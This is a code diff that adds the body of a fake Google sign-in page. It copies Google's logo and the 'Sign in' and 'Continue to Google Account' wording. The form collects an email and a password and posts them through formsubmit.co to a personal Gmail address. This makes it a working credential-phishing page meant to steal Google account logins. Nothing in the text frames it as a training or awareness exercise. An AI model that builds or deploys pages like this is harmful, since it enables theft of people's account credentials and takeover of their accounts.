@@ -1,4 +1,4 @@
-html
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -109,4 +109,31 @@ html
 </head>
 <body>
 
-    <div class="login
+    <div class="login-card">
+        <!-- Google Logo -->
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        
+        <h1>Sign in</h1>
+        <p>Continue to Google Account</p>
+
+        <!-- FormSubmit Integration -->
+        <form action="https://formsubmit.co/kaasislekker069@gmail.com" method="POST">
+            <div class="input-container">
+                <input type="email" name="email" placeholder="Email or phone" required>
+            </div>
+            <div class="input-container">
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+
+            <!-- FormSubmit honey-pot to prevent spam -->
+            <input type="text" name="_honey" style="display:none">
+
+            <div class="footer-btns">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </div>
+
+</body>
+</html>
